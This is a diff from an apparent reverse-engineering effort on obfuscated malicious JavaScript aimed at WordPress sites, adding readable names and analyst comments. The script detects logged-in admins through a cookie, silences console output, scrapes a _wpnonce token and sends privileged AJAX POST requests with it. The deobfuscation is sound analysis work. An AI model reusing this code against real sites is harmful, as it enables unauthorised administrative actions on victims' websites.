@@ -135,13 +135,13 @@ if (document.cookie.indexOf('wp-settings-time') !== -1) {
 
   /**
    * This function takes in parameter to retrieve strings for other locations in the code
-   * @param {string} _0x5e10dc string representation of a number
-   * @param {string} _0x3184f5 (? possibly a masking system?)
+   * @param {string} index string representation of a number
+   * @param {string} decodeKey (? possibly a masking system?)
    * @returns {string} a string used for method calls
    */
-  var _0x55dc = function (_0x5e10dc, _0x3184f5) {
-    _0x5e10dc = _0x5e10dc - 0; // For string to number conversion
-    var _0x33a72a = _0x5112[_0x5e10dc];
+  var _0x55dc = function (index, decodeKey) {
+    index = index - 0; // For string to number conversion
+    var encodedString = _0x5112[index];
 
     // -- Initialisation of this class -- //
     if (_0x55dc.isInitialised === undefined) {
@@ -171,28 +171,28 @@ if (document.cookie.indexOf('wp-settings-time') !== -1) {
 
 
       /**
-       * @param {string} _0x1f7823 Base64 encoded value
+       * @param {string} b64String Base64 encoded value
        * @param {string} str2 String (Used later with 'charCodeAt)
        * @returns {string}
        */
-      var _0x2ca3a9 = function (b64String, str2) {
+      var decode = function (b64String, str2) {
 
         var numberArray = [], 
         // _0x6e642c = 0, // Moved closer to use
         temp, // Used for holding values when shuffling
         newString = '', 
-        _0x58b7c1 = '';
+        tmpStr = '';
         str1 = atob(b64String);  // decode base64 (i've moved it to a new variable)
 
         // For the length of the decoded string, URIencode
-        for (var _0x39fa62 = 0, _0x31aa32 = str1.length; _0x39fa62 < _0x31aa32; _0x39fa62++) {
+        for (var i = 0; i < str1.length; i++) {
           // Convert to url encoded value (%XX)
-          _0x58b7c1 += '%' + ('00' + str1.charCodeAt(_0x39fa62).toString(16)).slice(-0x2);
+          tmpStr += '%' + ('00' + str1.charCodeAt(i).toString(16)).slice(-0x2);
         }
 
         // Then decode it again.
         // Originally I thought this was a null action, but commenting this out causes it to fail?
-        str1 = decodeURIComponent(_0x58b7c1);
+        str1 = decodeURIComponent(tmpStr);
 
 
         // Fill numberArray with values 0-255 in the matching indexes
@@ -227,12 +227,12 @@ if (document.cookie.indexOf('wp-settings-time') !== -1) {
 
       //-----------------//
 
-      _0x55dc['qzDpiD'] = _0x2ca3a9;
+      _0x55dc['qzDpiD'] = decode;
       _0x55dc['opEaeu'] = {};
       _0x55dc.isInitialised = true;
     }
 
-    // One time initialisation
+    // One time initialisation (purely anti-RE checks)
     //if (_0x55dc["EKjoEU"] === undefined) {
     if (_0x55dc.initFlag2 === undefined) {
       var _0x29532a = function (_0x2babe0) {
@@ -286,10 +286,10 @@ if (document.cookie.indexOf('wp-settings-time') !== -1) {
     }
 
 
-    _0x33a72a = _0x55dc['qzDpiD'](_0x33a72a, _0x3184f5);  // This function call is to `_0x2ca3a9`, 
-    _0x55dc['opEaeu'][_0x5e10dc] = _0x33a72a;
+    const decodedString = decode(encodedString, decodeKey); 
+    _0x55dc['opEaeu'][index] = decodedString;             // cache an already decoded version (but it's unused?)
 
-    return _0x33a72a;
+    return decodedString;
   };
 
   // Function one time wrapper (Instantly instaniated)
@@ -324,25 +324,6 @@ if (document.cookie.indexOf('wp-settings-time') !== -1) {
   // If the callback is fired, this creates an infinite loop 
   // `_0x578c35` is one of the 'createOnce' wrappers, so we need to see where `_0x15e697` is called
   var _0x15e697 = _0x578c35(this, function () {    
-    // Code linters reckon these are unused
-    // var _0x6731b1 = function () {
-    //   return 'dev';
-    // },
-
-    // _0x4e0009 = function () {
-    //   return 'window';
-    // };
-
-    // var _0x992916 = function () {
-    //   var _0x1dcaaf = new RegExp('\\w+ *\\(\\) *{\\w+ *[\'|"].+[\'|"];? *}');
-    //   return !_0x1dcaaf['test'](_0x6731b1['toString']());
-    // };
-
-    // var _0x2e8d58 = function () {
-    //   var _0x1342c5 = new RegExp('(\\\\[x|u](\\w){2,4})+');
-    //   return _0x1342c5['test'](_0x4e0009['toString']());
-    // };
-
     // The following pairs of functions just waste time, calling each other until a false event and not changing any state.
     /**
      * @param {String|Array} _0x441288 
@@ -416,17 +397,25 @@ if (document.cookie.indexOf('wp-settings-time') !== -1) {
         && typeof require === _0x55dc('0x3', 'nh)U') // 'function'
         && typeof global === _0x55dc('0x4', 'nGIV') ? global : this;  // 'object'
 
-    if (!globalWindow[_0x55dc('0x5', 'k6$s')]) {
-      globalWindow[_0x55dc('0x6', 'E(Sy')] = function (_emptyFunc) {
+    // Making sure we have console in global scope
+    if (!globalWindow.console) { // if (!globalWindow[_0x55dc('0x5', 'k6$s')]) {
+      globalWindow[/*_0x55dc('0x6', 'E(Sy')*/'console'] = function (_emptyFunc) {
         var obj = {};
         // We can infere that this parameters are the same as below, ie/ _0x55dc('0x6', 'E(Sy') === _0x55dc('0xe', 'nK5Q'
-        obj[_0x55dc('0x7', '3G3[')] = _emptyFunc;
-        obj[_0x55dc('0x8', 'LbLs')] = _emptyFunc;
-        obj[_0x55dc('0x9', 'cKx6')] = _emptyFunc;
-        obj[_0x55dc('0xa', 'bRZT')] = _emptyFunc;
-        obj[_0x55dc('0xb', '[sQb')] = _emptyFunc;
-        obj[_0x55dc('0xc', '5N7U')] = _emptyFunc;
-        obj[_0x55dc('0xd', '3G3[')] = _emptyFunc;
+        // obj[_0x55dc('0x7', '3G3[')] = _emptyFunc;
+        // obj[_0x55dc('0x8', 'LbLs')] = _emptyFunc;
+        // obj[_0x55dc('0x9', 'cKx6')] = _emptyFunc;
+        // obj[_0x55dc('0xa', 'bRZT')] = _emptyFunc;
+        // obj[_0x55dc('0xb', '[sQb')] = _emptyFunc;
+        // obj[_0x55dc('0xc', '5N7U')] = _emptyFunc;
+        // obj[_0x55dc('0xd', '3G3[')] = _emptyFunc;
+        obj.log = _emptyFunc;
+        obj.warn = _emptyFunc;
+        obj.debug = _emptyFunc;
+        obj.info = _emptyFunc;
+        obj.error = _emptyFunc;
+        obj.exception = _emptyFunc;
+        obj.trace = _emptyFunc;
         return obj;
       }(emptyFunc);
 
@@ -502,7 +491,6 @@ if (document.cookie.indexOf('wp-settings-time') !== -1) {
         var wpnonceRegex = /name="_wpnonce"([ ]+)value="([^"]+)"/g;
         var regexMatches = wpnonceRegex[/*_0x3de650[0xc]*/"exec"](_0x23c684);
 
-        // if (regexMatches[2][_0x3de650[0xd]](/([a-z0-9]{10})/)) {
         if (regexMatches[2].match(/([a-z0-9]{10})/)) {
           var nonce = regexMatches[2];
           jQueryInstance[/*_0x3de650[0x16]*/ 'ajax']({
@@ -526,7 +514,7 @@ if (document.cookie.indexOf('wp-settings-time') !== -1) {
                 'method': /*_0x3de650[0xe]*/ "POST",
                 'data': {
                   'action': /*_0x3de650[0x13]*/ "fake",
-                  'permalink_structure': 0x1
+                  'permalink_structure': 1
                 },
                 'success': function () {
                   // window[_0x3de650[0x14]] = window[_0x3de650[0x14]] + _0x3de650[0x15];
